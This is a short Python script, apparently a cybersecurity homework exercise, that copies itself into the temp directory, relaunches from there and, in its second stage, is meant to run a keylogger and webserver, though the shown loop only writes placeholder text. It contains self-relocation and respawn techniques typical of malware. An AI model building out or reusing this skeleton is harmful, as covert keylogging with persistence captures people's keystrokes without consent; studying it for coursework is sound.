import tempfile
import shutil
import subprocess
import sys
import os

from pynput.keyboard import Key, Listener as KeyboardListener
from threading import Lock
import schedule
from time import sleep
import atexit

from watchdog.observers import Observer
from watchdog.events import LoggingEventHandler

cur_file = __file__


#@atexit.register
#def goodbye():
#    #could also add a watchdog to be extra safe
#    if not cur_file.startswith(tempfile.gettempdir()):
#        return
#    print(cur_file)
#    subprocess.call(['python.exe', cur_file], cwd=tempfile.gettempdir())
    
def main_option1():
    #on the first run, not in tmp
    tmp = tempfile.TemporaryFile()
    file_location = tmp.name
    tmp.close()
    
    print(file_location)
    
    shutil.copyfile('runitself.py', file_location)

    #subprocess.call(['python.exe', file_location], cwd=tempfile.gettempdir())
    #os.startfile
    os.startfile('python.exe', arguments=['python.exe', file_location], cwd=tempfile.gettempdir())
    

def main_option2():
    #on the second run, not in tmp
    
    print('running keylogger')
    #here it will run a keylogger and a webserver
    while True:
        print('okkk')
        open(r'C:\Users\supem\Desktop\Homework\Cyber B\Hw2\keylogger\a.txt', 'a').write("wow")
        sleep(5)

if __name__ == '__main__':
    if cur_file.startswith(tempfile.gettempdir()):
        main_option2()
    else:
        main_option1()
            
        
    
